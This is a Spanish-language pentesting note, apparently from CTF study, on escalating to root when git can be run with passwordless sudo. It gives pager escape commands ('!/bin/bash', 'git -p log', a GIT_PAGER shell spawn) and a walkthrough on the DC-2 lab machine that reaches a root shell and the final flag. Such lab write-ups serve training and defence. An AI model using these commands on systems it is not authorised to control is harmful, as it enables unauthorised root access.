# Escalada de Privilegios via git

## Descripción

Si un usuario puede ejecutar `git` como root mediante sudo sin contraseña, puede obtener una shell root. git incluye comandos que abren paginadores (less/more) y desde esos paginadores se pueden ejecutar comandos del sistema.

---

## Detección

Aparece en la salida de `sudo -l`:

```
(root) NOPASSWD: /usr/bin/git
```

---

## Métodos de explotación

### Método 1 — git help ⭐ (más simple)

```shell
sudo git help config
```

o

```shell
sudo git help status
```

Esto abre el manual de git en un paginador. Dentro del paginador escribe:

```
!/bin/bash
```

o

```
!/bin/sh
```

El `!` ejecuta comandos del sistema desde el paginador. Como git se está ejecutando como root via sudo, la shell resultante es root.

### Método 2 — git -p log

```shell
sudo git -p log
```

Esto abre el historial de commits en un paginador. Dentro:

```
!/bin/bash
```

### Método 3 — GIT_PAGER

Forzar git a usar bash como paginador directamente:

```shell
sudo GIT_PAGER='sh -c "bash <$(tty) >$(tty) 2>$(tty)"' git log
```

---

## Por qué funciona

git usa paginadores (normalmente `less` o `more`) para mostrar output largo como manuales o logs. Estos paginadores tienen una función que permite ejecutar comandos del sistema escribiendo `!comando`. Como el proceso padre (git) se está ejecutando con sudo como root, los comandos ejecutados desde el paginador también heredan esos privilegios.

---

## Referencia

GTFOBins: `https://gtfobins.github.io/gtfobins/git/`

---

## Ejemplo real — Máquina DC-2

Como usuario jerry con `sudo git` sin contraseña:

```shell
jerry@DC-2:~$ sudo -l
# (root) NOPASSWD: /usr/bin/git

jerry@DC-2:~$ sudo git help config
# Se abre el manual en el paginador

# Dentro del paginador escribir:
!/bin/bash

root@DC-2:/home/jerry# whoami
# root ✅

root@DC-2:/home/jerry# cd /root
root@DC-2:~# cat final-flag.txt
# ¡Flag final!
```

La pista estaba en la Flag 4: *"Go on - git outta here!!!"* — juego de palabras con `git` y `get out of here`.
